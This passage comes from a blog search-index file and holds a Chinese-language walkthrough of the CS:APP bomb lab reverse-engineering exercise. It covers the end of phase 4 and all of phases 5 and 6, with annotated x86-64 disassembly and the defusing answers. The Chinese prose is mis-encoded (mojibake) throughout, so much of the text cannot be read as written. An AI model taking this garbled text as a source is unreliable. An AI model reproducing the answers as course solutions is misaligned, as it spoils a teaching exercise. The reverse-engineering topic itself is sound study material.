ç§»ä½å‚æ•°ï¼Œé»˜è®¤å³ç§»ä¸€ä½ï¼Œ%eax=0x7;</p><p>lea:%ecx=%rax+%rsi*1=0x7+0*1=0x7;</p><p>ä¹‹åå°†å‚æ•°x<sub>1</sub>ä¸%ecxæ¯”è¾ƒï¼Œå³0x7æ¯”è¾ƒï¼Œè‹¥å°äºç­‰äºä¸”å¤§äºç­‰äºåˆ™ç»“æŸï¼Œä¸”è¿”å›å€¼%eax=0ï¼›å¦åˆ™å°†å‚æ•°x<sub>1</sub>ï¼1åç»§ç»­è°ƒç”¨func4ã€‚</p><p>å›åˆ°phase_4ï¼Œå¯çŸ¥è¦ä½¿func4è¿”å›å€¼ä¸º0ï¼Œå¦åˆ™å°±ä¼šçˆ†ç‚¸ï¼Œæ‰€ä»¥å½“x1ä¸º7æ—¶æ°å¥½å¯ä»¥ä½¿è¿”å›å€¼ä¸º0ï¼Œç¬¦åˆï¼›</p><p>ä¹‹åå¾ˆå®¹æ˜“å¾—åˆ°å¿…é¡»è¦ä½¿å¾—ç¬¬äºŒä¸ªæ•°ä¸º0ï¼Œå¦åˆ™å°±ä¼šçˆ†ç‚¸ï¼›</p><p>æ•…å¯†ç ä¸ºï¼š7 0</p><p><img src="/posts/2ee63cf/image-20210316212318867.png" alt="image-20210316212318867"></p></li></ul><h2 id="5-phase_5"><a class="markdownIt-Anchor" href="#5-phase_5"></a> 5. phase_5</h2><ul><li><p><strong>æ±‡ç¼–ä»£ç ä¸æŒ‡ä»¤æ€è·¯</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401062 &lt;phase_5&gt;:<br>  401062:53                   push   %rbx<br>  401063:48 83 ec 20          sub    $0x20,%rsp<br>  401067:48 89 fb             mov    %rdi,%rbx*å°†æˆ‘ä»¬è¾“å…¥çš„ä¼ ç»™%rdx<br>  40106a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>  401071:00 00 <br>  401073:48 89 44 24 18       mov    %rax,0x18(%rsp)<br>  401078:31 c0                xor    %eax,%eax*é‡ç½®%raxä¸º0<br>  40107a:e8 9c 02 00 00       callq  40131b &lt;string_length&gt;*åˆ¤æ–­é•¿åº¦<br>  40107f:83 f8 06             cmp    $0x6,%eax<br>  401082:74 4e                je     4010d2 &lt;phase_5+0x70&gt;*ä¸ä¸º6åˆ™çˆ†ç‚¸<br>  401084:e8 b1 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401089:eb 47                jmp    4010d2 &lt;phase_5+0x70&gt;<br>  40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx<br>  40108f:88 0c 24             mov    %cl,(%rsp)<br>  401092:48 8b 14 24          mov    (%rsp),%rdx*1.ä¸Šè¿°ä¸‰ä¸ªæ“ä½œå°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦çš„ä½å››ä½ä¼ ç»™%rdx<br>  401096:83 e2 0f             and    $0xf,%edx<br>  401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx*2.å°†%rdxçš„å€¼ä½œä¸ºåç§»é‡ï¼Œå–å†…å­˜ä¸­çš„M[0x4024b0+%rdx]çš„å€¼<br>  4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)*å–å‡ºæ¥çš„å­—ç¬¦å­˜åˆ°åé¢çš„åœ°å€ä¸­<br>  4010a4:48 83 c0 01          add    $0x1,%rax*å°†ä¸Šè¿°æ“ä½œé‡å¤6æ¬¡<br>  4010a8:48 83 f8 06          cmp    $0x6,%rax<br>  4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;<br>  4010ae:c6 44 24 16 00       movb   $0x0,0x16(%rsp)<br>  4010b3:be 5e 24 40 00       mov    $0x40245e,%esi<br>  4010b8:48 8d 7c 24 10       lea    0x10(%rsp),%rdi*å°†å–å‡ºæ¥çš„6ä¸ªå­—ç¬¦å­˜åˆ°%rdiä¸­<br>  4010bd:e8 76 02 00 00       callq  401338 &lt;strings_not_equal&gt;*ä¸0x40245eåœ°å€ä¸­å€¼æ¯”è¾ƒï¼Œä¸ç›¸ç­‰å°±ä¼šçˆ†ç‚¸<br>  4010c2:85 c0                test   %eax,%eax<br>  4010c4:74 13                je     4010d9 &lt;phase_5+0x77&gt;<br>  4010c6:e8 6f 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4010cb:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)<br>  4010d0:eb 07                jmp    4010d9 &lt;phase_5+0x77&gt;<br>  4010d2:b8 00 00 00 00       mov    $0x0,%eax<br>  4010d7:eb b2                jmp    40108b &lt;phase_5+0x29&gt;<br>  4010d9:48 8b 44 24 18       mov    0x18(%rsp),%rax<br>  4010de:64 48 33 04 25 28 00 xor    %fs:0x28,%rax<br>  4010e5:00 00 <br>  4010e7:74 05                je     4010ee &lt;phase_5+0x8c&gt;<br>  4010e9:e8 42 fa ff ff       callq  400b30 &lt;__stack_chk_fail@plt&gt;<br>  4010ee:48 83 c4 20          add    $0x20,%rsp<br>  4010f2:5b                   pop    %rbx<br>  4010f3:c3                   retq  <br></code></pre></div></td></tr></table></figure></li><li><p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p><p>ä¸Šè¿°æŒ‡ä»¤ç®€è€Œè¨€ä¹‹å°±æ˜¯æˆ‘ä»¬è¾“å…¥6ä¸ªå­—ç¬¦ï¼Œç„¶åå–è¿™6ä¸ªå­—ç¬¦çš„å4ä½ä½œä¸ºåœ°å€ç´¢å¼•ï¼Œå–å†…å­˜ä¸­çš„M[0x4024b0+%rdx]çš„å€¼ï¼Œå­˜åˆ°å¦ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œç„¶åå°†è¿™ä¸ªå€¼ä¸M[0x40245e]ä¸­çš„å€¼æ¯”è¾ƒï¼Œç›¸ç­‰åˆ™ç»“æŸï¼Œå¦åˆ™çˆ†ç‚¸ï¼›</p><p>æ‰€ä»¥æˆ‘ä»¬å…ˆæŸ¥çœ‹å†…å­˜0x4024b0ä¸ºèµ·å§‹çš„åœ°å€ä¸­å­˜æ”¾çš„å…ƒç´ ï¼š</p><p><img src="/posts/2ee63cf/image-20210317085034624.png" alt="image-20210317085034624"></p><p>ç„¶åæŸ¥çœ‹0x40245eä¸­çš„å€¼ï¼š</p><p><img src="/posts/2ee63cf/image-20210317085132914.png" alt="image-20210317085132914"></p><p>ç„¶ååœ¨ä¸Šä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŸ¥çœ‹åä¸€ä¸ªå­—ç¬¦ä¸²å¯¹åº”çš„ä¸‹æ ‡ï¼Œå¾ˆå®¹æ˜“å¾—åˆ°ä¸‹æ ‡åˆ†åˆ«ä¸ºï¼š9  15  14  5  6  7</p><p>è¿™å…­ä¸ªæ•°ä½å››ä½çš„16è¿›åˆ¶ä¸ºï¼š0x9  0xf  0xe 0x5 0x6  0x7</p><p>æŸ¥çœ‹ASSCIè¡¨å¯çŸ¥9?n567æˆ–  9?&gt;567éƒ½å¯ä»¥ã€‚</p><p>æ‰€ä»¥å¯†ç å¯ä»¥ä¸º9?n567æˆ–  9?&gt;567ç­‰ç­‰ï¼Œç­”æ¡ˆä¸å”¯ä¸€</p><p><img src="/posts/2ee63cf/image-20210317090128611.png" alt="image-20210317090128611"></p></li></ul><h2 id="6-phase_6"><a class="markdownIt-Anchor" href="#6-phase_6"></a> 6. phase_6</h2><ul><li><p>æ±‡ç¼–ä»£ç å’ŒæŒ‡ä»¤æ€è·¯</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">00000000004010f4 &lt;phase_6&gt;:<br>  4010f4:41 56                push   %r14<br>  4010f6:41 55                push   %r13<br>  4010f8:41 54                push   %r12<br>  4010fa:55                   push   %rbp<br>  4010fb:53                   push   %rbx<br>  4010fc:48 83 ec 50          sub    $0x50,%rsp<br>  401100:49 89 e5             mov    %rsp,%r13<br>  401103:48 89 e6             mov    %rsp,%rsi<br>  401106:e8 51 03 00 00       callq  40145c &lt;read_six_numbers&gt;*è¯»å–å…­ä¸ªæ•°å­—<br>  40110b:49 89 e6             mov    %rsp,%r14<br>  40110e:41 bc 00 00 00 00    mov    $0x0,%r12d<br>  401114:4c 89 ed             mov    %r13,%rbp<br>  401117:41 8b 45 00          mov    0x0(%r13),%eax<br>  40111b:83 e8 01             sub    $0x1,%eax<br>  40111e:83 f8 05             cmp    $0x5,%eax<br>  401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;*ç¬¬ä¸€ä¸ªå¾ªç¯ï¼Œåˆ¤æ–­a[0]&lt;=6,æ˜¯ç»§ç»­ï¼Œå¦åˆ™çˆ†ç‚¸<br>  401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401128:41 83 c4 01          add    $0x1,%r12d*%r12dä¸ºç¬¬ä¸€ä¸ªå¾ªç¯è®¡æ•°å™¨<br>  40112c:41 83 fc 06          cmp    $0x6,%r12d<br>  401130:74 21                je     401153 &lt;phase_6+0x5f&gt;*ç»ˆæ­¢æ¡ä»¶ï¼Œå…­æ¬¡åç»“æŸ<br>  401132:44 89 e3             mov    %r12d,%ebx<br>  401135:48 63 c3             movslq %ebx,%rax<br>  401138:8b 04 84             mov    (%rsp,%rax,4),%eax<br>  40113b:39 45 00             cmp    %eax,0x0(%rbp)<br>  40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;*ç¬¬äºŒä¸ªå¾ªç¯ï¼Œa[i++],ä¾æ¬¡å’Œa[0]æ¯”è¾ƒï¼Œç›¸åŒåˆ™çˆ†ç‚¸<br>  401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401145:83 c3 01             add    $0x1,%ebx*%ebxä¸ºç¬¬äºŒä¸ªå¾ªç¯è®¡æ•°å™¨ï¼Œè®¡æ•°5æ¬¡<br>  401148:83 fb 05             cmp    $0x5,%ebx<br>  40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;<br>  40114d:49 83 c5 04          add    $0x4,%r13*ç»“åˆè¿™è¡Œï¼Œç¬¬ä¸€ä¸ªå¾ªç¯å°±æ˜¯åˆ¤æ–­æ¯ä¸ªæ•°éƒ½å°äºç­‰äº6<br>  401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;<br>  401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi<br>  401158:4c 89 f0             mov    %r14,%rax<br>  40115b:b9 07 00 00 00       mov    $0x7,%ecx<br>  401160:89 ca                mov    %ecx,%edx<br>  401162:2b 10                sub    (%rax),%edx<br>  401164:89 10                mov    %edx,(%rax)<br>  401166:48 83 c0 04          add    $0x4,%rax<br>  40116a:48 39 f0             cmp    %rsi,%rax<br>  40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;*ç¬¬ä¸‰å±‚å¾ªç¯ä¹‹åï¼Œa[i]=7-a[i] <br>  40116f:be 00 00 00 00       mov    $0x0,%esi<br>  401174:eb 21                jmp    401197 &lt;phase_6+0xa3&gt;<br>  401176:48 8b 52 08          mov    0x8(%rdx),%rdx<br>  40117a:83 c0 01             add    $0x1,%eax<br>  40117d:39 c8                cmp    %ecx,%eax<br>  40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;<br>  401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;<br>  401183:ba d0 32 60 00       mov    $0x6032d0,%edx<br>  401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)<br>  40118d:48 83 c6 04          add    $0x4,%rsi<br>  401191:48 83 fe 18          cmp    $0x18,%rsi<br>  401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;<br>  401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx<br>  40119a:83 f9 01             cmp    $0x1,%ecx<br>  40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;<br>  40119f:b8 01 00 00 00       mov    $0x1,%eax<br>  4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx*å­˜æ”¾é“¾è¡¨ç»“ç‚¹æ•°å€¼çš„èµ·å§‹åœ°å€<br>  4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;<br>  4011ab:48 8b 5c 24 20       mov    0x20(%rsp),%rbx<br>  4011b0:48 8d 44 24 28       lea    0x28(%rsp),%rax<br>  4011b5:48 8d 74 24 50       lea    0x50(%rsp),%rsi<br>  4011ba:48 89 d9             mov    %rbx,%rcx<br>  4011bd:48 8b 10             mov    (%rax),%rdx<br>  4011c0:48 89 51 08          mov    %rdx,0x8(%rcx)<br>  4011c4:48 83 c0 08          add    $0x8,%rax<br>  4011c8:48 39 f0             cmp    %rsi,%rax<br>  4011cb:74 05                je     4011d2 &lt;phase_6+0xde&gt;<br>  4011cd:48 89 d1             mov    %rdx,%rcx<br>  4011d0:eb eb                jmp    4011bd &lt;phase_6+0xc9&gt;*ç¡®å®šé“¾è¡¨æ•°å­—ä¸ºé™åºæ’åº<br>  4011d2:48 c7 42 08 00 00 00 movq   $0x0,0x8(%rdx)<br>  4011d9:00 <br>  4011da:bd 05 00 00 00       mov    $0x5,%ebp<br>  4011df:48 8b 43 08          mov    0x8(%rbx),%rax<br>  4011e3:8b 00                mov    (%rax),%eax<br>  4011e5:39 03                cmp    %eax,(%rbx)<br>  4011e7:7d 05                jge    4011ee &lt;phase_6+0xfa&gt;<br>  4011e9:e8 4c 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4011ee:48 8b 5b 08          mov    0x8(%rbx),%rbx<br>  4011f2:83 ed 01             sub    $0x1,%ebp<br>  4011f5:75 e8                jne    4011df &lt;phase_6+0xeb&gt;<br>  4011f7:48 83 c4 50          add    $0x50,%rsp<br>  4011fb:5b                   pop    %rbx<br>  4011fc:5d                   pop    %rbp<br>  4011fd:41 5c                pop    %r12<br>  4011ff:41 5d                pop    %r13<br>  401201:41 5e                pop    %r14<br>  401203:c3                   retq  <br></code></pre></div></td></tr></table></figure></li><li><p><strong>è§£å†³æ€è·¯ï¼š</strong></p><p>ä¸Šè¿°ä»£ç æ€è·¯æ¦‚æ‹¬å°±æ˜¯å°†é“¾è¡¨ç»“ç‚¹æ•°å€¼æŒ‰ç…§é™åºæ’åºï¼Œå…¶å¯¹åº”çš„æ•°å€¼å³ä¸ºé¡ºåºï¼Œæœ€åa[i]=7-a[i]ï¼Œå³ä¸ºæˆ‘ä»¬è¦è¾“å…¥çš„å€¼ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ç”¨gdbæŒ‡ä»¤æŸ¥çœ‹é“¾è¡¨çš„æ•°æ®ï¼š</p><p><img src="/posts/2ee63cf/image-20210317104905959.png" alt="image-20210317104905959"></p><p>è¿™å…­ä¸ªæ•°å­—æŒ‰ç…§é™åºæ’åˆ—å¯¹åº”çš„ç¼–ç é¡ºåºä¸ºï¼š3  4  5  6  1  2</p><p>è¿ç®—åå³ä¸ºï¼š4 3 2 1 6 5</p><p>æ•…å¯†ç ä¸ºï¼š4 3 2 1 6 5</p><p><img src="/posts/2ee63cf/image-20210317105113068.png" alt="image-20210317105113068"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç®—æœºç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
